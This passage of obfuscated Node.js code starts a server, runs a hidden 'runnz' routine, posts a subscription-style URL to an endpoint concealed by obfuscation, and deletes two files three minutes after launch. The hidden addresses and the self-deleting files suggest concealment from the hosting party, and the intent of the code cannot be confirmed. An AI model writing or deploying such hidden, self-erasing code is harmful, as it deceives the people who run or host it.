console[_0x568b64(_0x3578ee._0x512bda)](_0x568b64(_0x3578ee._0x3e74df));});}catch(_0x5685c4){console['error'](_0x88ccb(_0x5a7370._0x33f50f)+_0x5685c4);}};async function addAccessTask(){const _0x2d516a={_0x1ed713:0x26e,_0x1dd957:0x23d,_0xfdfe1:0x227,_0x4f0ecf:0x21c},_0x1f0dd8=_0xa56b0c;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x475aea=_0x1f0dd8(_0x2d516a._0x1ed713)+DOMAIN+'/'+SUB_PATH;try{const _0x288315=await axios[_0x1f0dd8(_0x2d516a._0x1dd957)](_0x1f0dd8(0x257),{'url':_0x475aea},{'headers':{'Content-Type':_0x1f0dd8(0x237)}});console[_0x1f0dd8(_0x2d516a._0xfdfe1)](_0x1f0dd8(_0x2d516a._0x4f0ecf));}catch(_0x496be8){}}const delFiles=()=>{const _0x40ba62=_0xa56b0c;[_0x40ba62(0x1f1),_0x40ba62(0x261)]['forEach'](_0x3325bb=>fs[_0x40ba62(0x288)](_0x3325bb,()=>{}));};httpServer[_0xa56b0c(0x226)](PORT,()=>{runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
